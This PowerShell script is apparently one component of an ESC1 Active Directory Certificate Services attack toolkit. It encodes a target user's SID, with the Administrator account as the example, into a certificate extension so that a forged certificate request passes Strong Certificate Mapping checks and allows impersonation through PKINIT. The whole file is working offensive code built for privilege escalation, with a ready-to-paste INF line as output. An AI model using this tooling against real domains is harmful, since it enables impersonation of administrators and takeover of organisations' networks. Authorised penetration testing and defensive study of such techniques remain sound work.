<#
.SYNOPSIS
    Generates the DER-encoded hex for the szOID_NTDS_CA_SECURITY_EXT SID extension.

.DESCRIPTION
    Converts a SID string into the DER-encoded hex value needed for the
    certificate INF file's [Extensions] section. This embeds the target user's
    SID into OID 1.3.6.1.4.1.311.25.2, which satisfies KB5014754 Strong
    Certificate Mapping enforcement.

    Without this extension, PKINIT will fail with KDC_ERR_CERTIFICATE_MISMATCH
    on DCs running the May 2025+ full enforcement mode.

.PARAMETER SidString
    The SID of the target user to impersonate (e.g. S-1-5-21-...-500).

.EXAMPLE
    .\Get-SidExtensionHex.ps1 -SidString "S-1-5-21-1234567890-987654321-1122334455-500"

.EXAMPLE
    # Get Administrator SID and generate hex in one line
    $sid = (Get-ADUser Administrator).SID.Value
    .\Get-SidExtensionHex.ps1 -SidString $sid

.OUTPUTS
    Returns the hex string. Also prints the ready-to-paste INF extension line.
#>

[CmdletBinding()]
param(
    [Parameter(Position = 0)]
    [string]$SidString
)

function Get-SidExtensionHex {
    param([Parameter(Mandatory = $true)][string]$SidString)

    $sidAscii = [System.Text.Encoding]::ASCII.GetBytes($SidString)

    # OID 1.3.6.1.4.1.311.25.2.1 (szOID_NTDS_CA_SECURITY_EXT inner OID)
    $oid = [byte[]](0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02, 0x01)

    # OCTET STRING wrapping SID ASCII string
    $octet = [byte[]](0x04, $sidAscii.Length) + $sidAscii

    # Inner CONTEXT[0] wrapping OCTET STRING
    $innerCtx = [byte[]](0xA0, $octet.Length) + $octet

    # Outer CONTEXT[0] wrapping OID + inner CONTEXT[0]
    $outerContent = $oid + $innerCtx
    $outerCtx = [byte[]](0xA0, $outerContent.Length) + $outerContent

    # SEQUENCE wrapping everything
    $seq = [byte[]](0x30, $outerCtx.Length) + $outerCtx

    $hex = ($seq | ForEach-Object { '{0:x2}' -f $_ }) -join ''

    return $hex
}

# Only run when called directly, not when dot-sourced by Invoke-ESC1.ps1
if ($SidString) {
    $hex = Get-SidExtensionHex -SidString $SidString

    Write-Host ""
    Write-Host "[*] SID string : $SidString ($([System.Text.Encoding]::ASCII.GetBytes($SidString).Length) chars)" -ForegroundColor Cyan
    Write-Host "[*] DER hex    : $hex" -ForegroundColor Green
    Write-Host ""
    Write-Host "[*] INF extension line:" -ForegroundColor Yellow
    Write-Host "1.3.6.1.4.1.311.25.2 = ""{hex}$hex""" -ForegroundColor White
    Write-Host ""

    return $hex
}
